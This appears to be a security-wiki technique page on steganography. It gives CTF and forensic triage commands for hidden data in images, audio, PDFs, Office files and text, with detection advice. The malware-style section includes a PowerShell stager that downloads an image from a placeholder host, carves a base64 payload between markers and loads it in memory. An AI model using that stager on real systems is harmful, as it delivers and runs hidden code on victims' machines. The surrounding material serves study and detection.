---
title: "Steganography"
type: technique
tags: [steganography, ctf, forensics, lsb, image, audio]
phase: post-exploitation
date_created: 2026-06-16
date_updated: 2026-07-14
sources: [hacktricks-stego]
---

## What it is

Data hidden inside carrier media (images, audio, files, text) so its presence is concealed. Almost exclusively a CTF category, but the techniques overlap with covert-channel exfiltration.

## How it works

Carriers have redundant capacity: low-order bits of pixels/samples, metadata fields, space after logical EOF, or imperceptible character variants. Stego embeds payload there; extraction reverses the embedding or brute-forces a passphrase.

## Attack phases
Post-exploitation / analysis (CTF; covert exfil awareness).

## Prerequisites
- The carrier file. A passphrase or wordlist for tools like steghide.

## Methodology

### Always first
```bash
file f;  exiftool f;  strings -n6 f;  binwalk f      # metadata, appended/embedded data
binwalk -e f                                         # extract zip/file hidden after EOF
```

### Images
```bash
zsteg -a image.png                  # PNG/BMP LSB, all channels/bit-orders
steghide extract -sf image.jpg      # JPG/BMP/WAV, passphrase-protected
stegseek image.jpg rockyou.txt      # brute steghide passphrase (fast)
outguess -r image.jpg out.txt
pngcheck -v image.png               # malformed chunks / appended data
```
- **stegsolve** (or `convert`): cycle bit planes and colour channels; look for QR/text in a single plane. LSB-extract scripts for custom embeddings.
- Compare to original if provided: `cmp` / visual diff reveals modified pixels.

### Audio
- Spectrogram view (Audacity / sonic-visualiser) -> text/SSTV image hidden in frequencies.
- LSB in WAV (`WavSteg`, `stego-lsb`). DTMF tones (`multimon-ng`), Morse, reversed/slowed audio.

### Files / containers
- Polyglots (file valid as two types); ZIP appended to image (`binwalk`/`unzip`); password ZIP -> `zip2john` + [[hashcat]].
- NTFS Alternate Data Streams (`dir /R`, `streams.exe`); PDF/Office embedded objects.

### Text
- Zero-width characters / unicode steg (whitespace tools, `stegsnow`); base/rot layers -> [[encoding-transformations]]; whitespace `snow`.

## Bypasses and variants
- Multi-stage: image -> embedded zip (password in EXIF) -> stego inside extracted file. Re-run the full triage on every extracted artifact.
- Unknown tool: entropy + known headers narrow the embedding scheme.

## Detection and defence
Strip metadata on upload, re-encode media (destroys LSB payloads), entropy/steganalysis scanning.

## Tools
`steghide`, `stegseek`, `zsteg`, `binwalk` ([[binwalk]]), `exiftool`, stegsolve, sonic-visualiser / Audacity, `stegsnow`, `outguess`. Pairs with [[digital-forensics]].

## Image format-internal stego: chunks, DCT, ELA, FFT, and animation

Payloads often live at the container/chunk level, not in pixel LSBs. Branch by format after `binwalk`/`exiftool`/`strings`:

PNG/BMP (structure and chunks):
```bash
magick identify -verbose file.png    # weird width/height/bit-depth/colour-type
pngcheck -vp file.png                # CRC/chunk errors point to exact offset; flags data after IEND
exiftool -a -u -g1 file.png
```
High-signal chunks: `tEXt`/`iTXt`/`zTXt` (text, sometimes zlib-compressed), `iCCP`, `eXIf`, plus bytes appended after `IEND`. Enumerate LSB/bit-plane variants with `zsteg -a`; visual/channel transforms with StegoVeritas or Stegsolve.

JPEG (DCT domain, not raw pixels): metadata/comment payloads are file-level and quick (`EXIF`/`XMP`/`IPTC`, `COM`, `APPn`). DCT-domain tools: OutGuess, OpenStego, F5-family; steghide passphrase brute with `stegseek file.jpg rockyou.txt`. Error Level Analysis highlights recompressed/edited regions but is not itself a stego detector.

Frequency hiding: content placed in frequency space needs FFT view, not LSB (FFTStegPic, online Fourier tools).

Animated (GIF/APNG): the message may be one frame, spread across frames, or only visible in frame diffs.
```bash
ffmpeg -i anim.gif frame_%04d.png                 # or: gifsicle --explode anim.gif
magick frame_0001.png frame_0002.png -compose difference -composite diff.png
```
APNG pixel-count encoding: each byte can be the count of a specific colour per frame; sum the counts across frames to rebuild the message (PIL `Image.open(f).getcolors()` -> `dict(...).get((r,g,b,a))`). Web triage that runs many of these at once: Aperi'Solve, StegOnline.

## Audio stego: FSK/modem decode and CLI spectrograms

Beyond spectrogram messages and DTMF, tonal/alternating-tone audio is often FSK modem data. Estimate centre/shift/baud from a spectrogram, then brute the baud with minimodem until printable text appears:
```bash
sox noise.wav -n spectrogram -o spec.png     # CLI spectrogram to pick baud/frequency
minimodem -f noise.wav 45                     # try common bauds
minimodem -f noise.wav 300
minimodem -f noise.wav 1200
minimodem -f noise.wav 2400
# garbled? add --rx-invert or --samplerate
```
Triage first with `ffmpeg -v info -i file -f null -` for codec/anomalies. WAV LSB stays `WavSteg -r -b <bits>`; also watch for phase-coding, echo-hiding, and spread-spectrum embeds. DeepSound is a common Windows carrier.

## Document and container stego plus carving and near-stego decoders

Documents are containers first. PDF = objects + streams + optional embedded files:
```bash
pdfinfo file.pdf
pdfdetach -list file.pdf && pdfdetach -saveall file.pdf   # pull attachments
qpdf --qdf --object-streams=disable file.pdf out.pdf      # flatten streams, then grep out.pdf
```
OOXML (`.docx/.xlsx/.pptx`) is a ZIP: `7z x file.docx -oout`, then inspect `word/document.xml`, `word/_rels/` (external relationships), and `word/media/`.

Carving when `file` is confused or `binwalk -e` fails: `tail -c 200 file | xxd`, `xxd -g1 -l32 file` to read magic, then carve at a known offset with `dd if=file of=carved.bin bs=1 skip=<offset>` and re-`file`. Try `7z l` / `unzip -l` even when the extension lies. Near-stego shapes: a blob whose length is a perfect square (`python3 -c "import math;print(math.isqrt(2500))"`) is often raw pixels/QR (dcode binary-image); braille and Bacon (5-bit groups) also recur.

## Malware-style stego: marker-delimited image payloads and CSS text channels

Commodity loaders rarely use pixel LSB. They embed a base64 payload as plain text inside a valid image (often GIF/PNG), delimited by unique marker strings; a stager downloads the image, carves between the markers, base64-decodes, and loads in-memory (ATT&CK T1027.003). Related delivery/obfuscation tradecraft: [[html-smuggling]].
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://x/p.gif')
$s = $img.IndexOf('<<mark_a>>'); $e = $img.IndexOf('<<mark_b>>')
$b64 = $img.Substring($s + '<<mark_a>>'.Length, $e - ($s + '<<mark_a>>'.Length))
[Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
```
Hunt: scan downloaded images for delimiter strings; flag scripts that fetch an image then immediately call a base64 decoder (`FromBase64String`, JS `atob`); flag `image/*` responses whose body carries long ASCII/base64. Text-channel variant: CSS `@font-face` `unicode-range: U+..` entries can carry bytes, extract with `grep -o "U+[0-9A-Fa-f]\+" styles.css | tr -d 'U+\n' | xxd -r -p`. Inspect suspicious text codepoints (homoglyphs, zero-width, bidi overrides) with a small Python loop over `ord(ch) > 127 or ch.isspace()`.

## Sources

- HackTricks (stego), ingest slug `hacktricks-stego`.
